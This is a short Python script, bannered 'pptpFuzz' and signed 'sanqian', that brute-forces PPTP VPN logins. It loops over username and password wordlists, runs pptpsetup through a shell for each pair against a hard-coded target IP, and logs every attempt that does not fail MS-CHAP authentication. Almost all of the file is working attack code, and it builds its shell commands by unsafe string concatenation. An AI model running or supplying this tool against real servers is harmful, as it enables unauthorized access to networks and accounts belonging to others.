import datetime
import os
def test_vpn(ip):
    user=[]
    passwd=[]
    for tuser in rfile("user"):
        user.append(tuser.split('\n')[0])

    for tpass in rfile("passwd"):
        passwd.append(tpass.split('\n')[0])

    for name in user:
        cw = "MS-CHAP authentication failed"
        for pswd in passwd:
            command = 'pptpsetup --create testvpn --server '+ip+' --username '+name+' --password '+pswd+' --encrypt --start'
            vpn_status =  os.popen(command).read()
            print(command)
            print (vpn_status)
            if cw in vpn_status:
                print(command)
                print(vpn_status)
            else:
                wfile("jg",command,vpn_status)

def rfile(path):
    with open(path, "r", encoding='utf-8') as f:
        ftext = f.readlines()
        return ftext

def wfile(path,command_jg,vpn_status_jg):
    # wjg=[]
    # wjg=wjg.append(datetime+'\n'+command_jg+'\n'+vpn_status_jg+'\n')
    with open(path,'a+',encoding='utf-8') as f:
        f.write(command_jg)
        f.write(vpn_status_jg)
        f.write('\n')

if __name__ == '__main__':
    print("""               __        ___________                    
______ _______/  |_______\_   _____/_ __________________
\____ \\\\____ \   __\____ \|    __)|  |  \___   /\___   /
|  |_> >  |_> >  | |  |_> >     \ |  |  //    /  /    / 
|   __/|   __/|__| |   __/\___  / |____//_____ \/_____ \\
|__|   |__|        |__|       \/              \/      \/        ---sanqian""")
    # 此处修改目标
    test_vpn('5x.xxx.xxx.xx2')